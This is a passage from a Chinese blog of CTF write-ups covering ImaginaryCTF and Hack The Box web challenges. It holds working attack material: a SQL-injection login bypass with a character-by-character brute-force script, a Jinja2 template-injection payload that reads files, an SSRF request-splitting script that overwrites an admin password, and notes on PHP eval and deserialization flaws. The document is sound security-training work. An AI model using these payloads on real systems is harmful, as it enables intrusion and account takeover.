class="hljs-number">42</span>, <span class="hljs-number">16</span>, <span class="hljs-number">125</span>, <span class="hljs-number">231</span>):<br>            <span class="hljs-attribute">return</span> <span class="hljs-number">0</span><br>        <span class="hljs-attribute">if</span> image.getpixel((<span class="hljs-number">264</span>, <span class="hljs-number">143</span>)) != (<span class="hljs-number">122</span>, <span class="hljs-number">136</span>, <span class="hljs-number">25</span>, <span class="hljs-number">213</span>):<br>            <span class="hljs-attribute">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-attribute">with</span> exiftool.ExifToolHelper() as et:<br>        <span class="hljs-attribute">metadata</span> = et.get_metadata(app.config[&#x27;UPLOAD_FOLDER&#x27;] + uploaded_image)[<span class="hljs-number">0</span>]<br>        <span class="hljs-attribute">try</span>:<br>            <span class="hljs-attribute">if</span> metadata[<span class="hljs-string">&quot;PNG:Description&quot;</span>] != <span class="hljs-string">&quot;jctf&#123;not_the_flag&#125;&quot;</span>:<br>                <span class="hljs-attribute">return</span> <span class="hljs-number">0</span><br>            <span class="hljs-attribute">if</span> metadata[<span class="hljs-string">&quot;PNG:Title&quot;</span>] != <span class="hljs-string">&quot;kool_pic&quot;</span>:<br>                <span class="hljs-attribute">return</span> <span class="hljs-number">0</span><br>            <span class="hljs-attribute">if</span> metadata[<span class="hljs-string">&quot;PNG:Author&quot;</span>] != <span class="hljs-string">&quot;anon&quot;</span>:<br>                <span class="hljs-attribute">return</span> <span class="hljs-number">0</span><br>        <span class="hljs-attribute">except</span>:<br>            <span class="hljs-attribute">return</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">return</span> flag<br></code></pre></td></tr></table></figure><p>需要上传符合以上要求的图片<br>抄个脚本（exiftool.exe）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import subprocess<br><span class="hljs-keyword">from</span> PIL import Image, ImageDraw<br><br>def create_flag_image(filename):<br>    img = Image.new(<span class="hljs-string">&#x27;RGBA&#x27;</span>, (690, 420), color=(255, 255, 255, 255))<br>    draw = ImageDraw.Draw(img)<br>    draw.point((412, 309), fill=(52, 146, 235, 123))<br>    draw.point((12, 209), fill=(42, 16, 125, 231))<br>    draw.point((264, 143), fill=(122, 136, 25, 213))<br>    img.save(filename)<br><br>def set_image_metadata(image_path):<br>    metadata = &#123;<br>        <span class="hljs-string">&quot;PNG:Description&quot;</span>: <span class="hljs-string">&quot;jctf&#123;not_the_flag&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;PNG:Title&quot;</span>: <span class="hljs-string">&quot;kool_pic&quot;</span>,<br>        <span class="hljs-string">&quot;PNG:Author&quot;</span>: <span class="hljs-string">&quot;anon&quot;</span><br>    &#125;<br><br>    command = [<span class="hljs-string">&quot;exiftool&quot;</span>, <span class="hljs-string">&quot;-overwrite_original&quot;</span>]<br>    <span class="hljs-keyword">for</span> tag, value <span class="hljs-keyword">in</span> metadata.items():<br>        command.append(f<span class="hljs-string">&quot;-&#123;tag&#125;=&#123;value&#125;&quot;</span>)<br>    command.append(image_path)<br><br>    subprocess.<span class="hljs-built_in">run</span>(command, <span class="hljs-attribute">capture_output</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">text</span>=<span class="hljs-literal">True</span>)<br><br>def view_image_metadata(image_path):<br>    command = [<span class="hljs-string">&quot;exiftool&quot;</span>, image_path]<br>    result = subprocess.<span class="hljs-built_in">run</span>(command, <span class="hljs-attribute">capture_output</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">text</span>=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">if</span> result.returncode == 0:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Metadata for image: &quot;</span>, image_path)<br>        <span class="hljs-built_in">print</span>(result.stdout)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error:&quot;</span>, result.stderr)<br><br>img_filename = <span class="hljs-string">&quot;flag.png&quot;</span><br>created_filename = create_flag_image(img_filename)<br>set_image_metadata(img_filename)<br>view_image_metadata(img_filename)<br></code></pre></td></tr></table></figure><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>按下F12查看原码<br>瞎了没看到source几个大字<br>还是sqlite3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">&#x27;FLAG&#x27;</span>] ?? <span class="hljs-string">&#x27;jctf&#123;test_flag&#125;&#x27;</span>; <span class="hljs-comment">#如果无法从环境变量中获取到FLAG，那么就把后</span><br>面的那个赋值给<span class="hljs-variable">$flag</span><br><span class="hljs-variable">$magic</span> = <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">&#x27;MAGIC&#x27;</span>] ?? <span class="hljs-string">&#x27;aabbccdd11223344&#x27;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span>(<span class="hljs-string">&#x27;/db.sqlite3&#x27;</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$magic</span>])) &#123;<br>    <span class="hljs-variable">$password</span> .= <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$password</span>) &#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">querySingle</span>(<span class="hljs-string">&quot;SELECT username, pwhash FROM users WHERE username =&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>, <span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>) &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Invalid username or password&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-variable">$password</span>, <span class="hljs-variable">$res</span>[<span class="hljs-string">&#x27;pwhash&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$u</span> = <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$res</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Welcome <span class="hljs-subst">$u</span>! But there is no flag here :P&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-variable">$msg</span> .= <span class="hljs-string">&quot;&lt;!-- magic: <span class="hljs-subst">$magic</span> --&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Invalid username or password&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>...<br>有个<span class="hljs-meta">&lt;?=</span> <span class="hljs-variable">$msg</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>另一部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//echo password_hash(&quot;a&quot;, PASSWORD_DEFAULT);</span><br><span class="hljs-keyword">echo</span><br><span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;<span class="hljs-subst">$2y</span><span class="hljs-subst">$10</span><span class="hljs-subst">$5OlXnb0eEfoadvdCwULWvuKVU3HFUL7bElISRItRVbDySKxrHMiC</span></span><br><span class="hljs-string">O&quot;</span>)<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"># 判断变量$password的hash值是否等于第二个参数(存入数据库当中的经哈希处理后的字符串)，使用PASSWORD_BCRYPY算法加密，被加密字符串最多长72个字节</span><br></code></pre></td></tr></table></figure><p>1.得到magic，使得password带上flag<br>2.通过对username的注入登录到admin，获取到magic<code>688a35c685a7a654abc80f8e123ad9f0</code>:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">password</span>=a&amp;username=a<span class="hljs-string">&#x27; UNION SELECT &#x27;</span><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; AS</span><br><span class="hljs-string">username,&#x27;</span><span class="hljs-meta">$2</span>y<span class="hljs-meta">$10</span><span class="hljs-meta">$5</span>OlXnb0eEfoadvdCwULWvuKVU3HFUL7bElISRItRVbDySKxrHMiCO<span class="hljs-string">&#x27; AS</span><br><span class="hljs-string">pwhash/*</span><br></code></pre></td></tr></table></figure><p>由于只判断前72个字符，可进行爆破<br>脚本：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><br>url = <span class="hljs-string">&quot;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&quot;</span><br><br>able =<br><span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;<span class="hljs-subst">#$</span>%&amp;&#x27;()*+,-./</span><br><span class="hljs-string">:;&lt;=&gt;?@[\]^`&#123;|~&#125;&quot;</span><br>flag = <span class="hljs-string">&quot;ictf&#123;&quot;</span><br><br><span class="hljs-keyword">while</span> True:<br>    length = <span class="hljs-number">71</span> - len(flag)<br>    password = <span class="hljs-string">&quot;a&quot;</span> * length<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> able:<br>        guess = password + flag + i<br>        hash = os.popen(f<span class="hljs-string">&quot;php exp.php &#123;guess&#125;&quot;</span>).read()<br>        headers = &#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>&#125; <span class="hljs-comment"># need</span><br><span class="hljs-keyword">for</span> <span class="hljs-literal">it</span><br>        data = f<span class="hljs-string">&quot;username=a&#x27; UNION SELECT &#x27;admin&#x27; AS username,&#x27;&#123;hash&#125;&#x27; AS pwhash/*&amp;password=&#123;password&#125;&quot;</span><br>        r = requests.post(url, data=data, headers=headers)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag += i<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag[-<span class="hljs-number">1</span>:] == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], PASSWORD_DEFAULT);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/7/28：hack the box记录</title>
    <link href="/2023/07/28/haxonbox/"/>
    <url>/2023/07/28/haxonbox/</url>
    
    <content type="html"><![CDATA[<p>Challenges-&gt;active challenges</p><h2 id="Templated"><a href="#Templated" class="headerlink" title="Templated"></a>Templated</h2><p>非常简单的Flask/jinja2模板注入</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p>啥过滤也没有，唯一难点估计是一眼看过去不知道注入点在哪，F12啥也没有</p><h2 id="Phonebook"><a href="#Phonebook" class="headerlink" title="Phonebook"></a>Phonebook</h2><p>没写出来，没啥头绪<br>··············分割线·······················<br>进入靶机注意到这是个登录界面，尝试单双引号测试，显示登录失败，注意到url后?message提供错误信息，可以在url中修改改变红框内的报错信息，但没啥用。下面有个蓝色框的贴士<br>输入“\”页面无法连接，输入“*”进入搜索界面，输入1得到用户信息，然后卡了<br>··············分割线·······················<br>writeup:<a href="https://blog.csdn.net/galaxy3000/article/details/122975302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169052768016800184190415%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169052768016800184190415&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122975302-null-null.142%5Ev91%5Ekoosearch_v1,239%5Ev3%5Einsert_chatgpt&amp;utm_term=hackthebox%20phonebook&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/galaxy3000/article/details/122975302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169052768016800184190415%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169052768016800184190415&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122975302-null-null.142^v91^koosearch_v1,239^v3^insert_chatgpt&amp;utm_term=hackthebox%20phonebook&amp;spm=1018.2226.3001.4187</a></p><p>查看wp发现是模糊测试<br>这是啥？<br>通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞，用随机坏数据（也称做 fuzz）攻击一个程序，然后等着观察哪里遭到了破坏。模糊测试的技巧在于，将尽可能多的杂乱数据投入程序中。</p><p>解题需要找出管理员密码，而登陆前的贴士告诉了管理员是谁，查找得管理员username为reese<br>接下来需要写脚本暴力破解，时间较久，但网络不太行出不来</p><h2 id="Weather-APP"><a href="#Weather-APP" class="headerlink" title="Weather APP"></a>Weather APP</h2><p>服务端请求伪造加SQL密码更新<br>··············分割线·······················<br>index.js可以看到：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (req.socket.remoteAddress.<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/^.*:/</span>, <span class="hljs-string">&#x27;&#x27;</span>) != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><span class="hljs-keyword">return</span> res.status(<span class="hljs-number">401</span>).end();<br>&#125;<br><br>    ...<br><br>    <span class="hljs-keyword">if</span> (admin) <span class="hljs-keyword">return</span> res.send(fs.readFileSync(<span class="hljs-string">&#x27;/app/flag&#x27;</span>).toString());<br></code></pre></td></tr></table></figure><p>说明此题需要对请求进行伪造且以管理员身份登录</p><p>database.js可以看到：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;$&#123; crypto.randomBytes(32).toString(&#x27;</span>hex<span class="hljs-string">&#x27;) &#125;&#x27;</span>);<br><br>...<br><br>let query = `<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;$&#123;user&#125;&#x27;</span>, <span class="hljs-string">&#x27;$&#123;pass&#125;&#x27;</span>)<span class="hljs-symbol">`;</span><br></code></pre></td></tr></table></figure><p>管理员的密码进行了加密且username字段设置为不可重复，但注册界面没有进行过滤，可以选择密码更新<br>（好像sql-lab第17题是密码更新）<br>··············分割线·······················<br>wp:<a href="https://blog.csdn.net/wanmiqi/article/details/115873643">https://blog.csdn.net/wanmiqi/article/details/115873643</a><br>脚本：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import requests<br><br>url = <span class="hljs-string">&quot;http://157.245.39.76:31075&quot;</span><br><br>username = <span class="hljs-string">&#x27;admin&#x27;</span><br>password = <span class="hljs-string">&quot;1111&#x27;) ON CONFLICT(username) DO UPDATE SET password = &#x27;admin&#x27;;--&quot;</span><br>parseUsername = username<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;\u0120&quot;</span>)<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;%27&quot;</span>)<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;%22&quot;</span>)<br>parsePassword = password<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;\u0120&quot;</span>)<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;%27&quot;</span>)<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;%22&quot;</span>)<br>contentLength = <span class="hljs-built_in">len</span>(parseUsername) + <span class="hljs-built_in">len</span>(parsePassword) + <span class="hljs-number">19</span><br>endpoint =  <span class="hljs-string">&#x27;127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHOST:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120&#x27;</span> + <span class="hljs-built_in">str</span>(contentLength) + <span class="hljs-string">&#x27;\u010D\u010A\u010D\u010Ausername=&#x27;</span> + parseUsername + <span class="hljs-string">&#x27;&amp;password=&#x27;</span> + parsePassword + <span class="hljs-string">&#x27;\u010D\u010A\u010D\u010AGET\u0120/?lol=&#x27;</span><br>r = requests<span class="hljs-selector-class">.post</span>(url + <span class="hljs-string">&#x27;/api/weather&#x27;</span>, json=&#123;<span class="hljs-string">&#x27;endpoint&#x27;</span>: endpoint, <span class="hljs-string">&#x27;city&#x27;</span>: <span class="hljs-string">&#x27;chengdu&#x27;</span>, <span class="hljs-string">&#x27;country&#x27;</span>: <span class="hljs-string">&#x27;CN&#x27;</span>&#125;)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(r)</span></span><br></code></pre></td></tr></table></figure><h2 id="LoveTok"><a href="#LoveTok" class="headerlink" title="LoveTok"></a>LoveTok</h2><p>命令注入<br>··············分割线·······················<br>TimeController.php中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$format</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>] : <span class="hljs-string">&#x27;r&#x27;</span>;<br><span class="hljs-variable">$time</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TimeModel</span>(<span class="hljs-variable">$format</span>);<br></code></pre></td></tr></table></figure><p>TimeModel.php</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">class TimeModel<br>&#123;<br>    public function __construct($format)<br>    &#123;<br>        $this-&gt;<span class="hljs-keyword">format</span> = addslashes($format);<br><br>        [ $d, $h, $m, $s ] = [ <span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>), <span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">23</span>), <span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">59</span>), <span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">69</span>) ];<br>        $this-&gt;prediction = <span class="hljs-string">&quot;+<span class="hljs-subst">$&#123;d&#125;</span> day +<span class="hljs-subst">$&#123;h&#125;</span> hour +<span class="hljs-subst">$&#123;m&#125;</span> minute +<span class="hljs-subst">$&#123;s&#125;</span> second&quot;</span>;<br>    &#125;<br><br>    public function getTime()<br>    &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$time = date(&quot;&#x27;</span> . $this-&gt;<span class="hljs-keyword">format</span> . <span class="hljs-string">&#x27;&quot;, strtotime(&quot;&#x27;</span> . $this-&gt;prediction . <span class="hljs-string">&#x27;&quot;));&#x27;</span>);<br>        <span class="hljs-keyword">return</span> isset($time) ? $time : <span class="hljs-string">&#x27;Something went terribly wrong&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对输入（format）只有简单的过滤就把它放出来了<br>··············分割线·······················<br>wp:<a href="https://shakuganz.com/2021/06/23/hackthebox-lovetok-write-up/">https://shakuganz.com/2021/06/23/hackthebox-lovetok-write-up/</a></p><h2 id="一点反思"><a href="#一点反思" class="headerlink" title="一点反思"></a>一点反思</h2><p>Weather App和LoveTok的题目都有不少文件，大部分没啥用，能在这些东西中找到能用的漏洞才能有突破口<br>LoveTok中接受了$_SERVER变量，但好像没啥用，可以算一个干扰吧<br>耐心看完题目逻辑才能知道大概干啥，以及多看看，不然都不知道题目想干啥</p><h2 id="Toxic"><a href="#Toxic" class="headerlink" title="Toxic"></a>Toxic</h2><p>下载源码，一眼php反序列化，但写之后其实算命令注入+文件包含<br>··············分割线·······················<br>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">spl_autoload_register</span>(function (<span class="hljs-variable">$name</span>)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/Model$/&#x27;</span>, <span class="hljs-variable">$name</span>))<br>    &#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;models/$&#123;name&#125;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;$&#123;name&#125;.php&quot;</span>;<br>&#125;);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageModel</span>;<br>    <span class="hljs-variable">$page</span>-&gt;file = <span class="hljs-string">&#x27;/www/index.html&#x27;</span>;<br><br>    <span class="hljs-title function_ invoke__">setcookie</span>(<br>        <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>, <br>        <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$page</span>)), <br>        <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>, <br>        <span class="hljs-string">&#x27;/&#x27;</span><br>    );<br>&#125; <br><br><span class="hljs-variable">$cookie</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>]);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cookie</span>);<br></code></pre></td></tr></table></figure><p>PageModel.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span 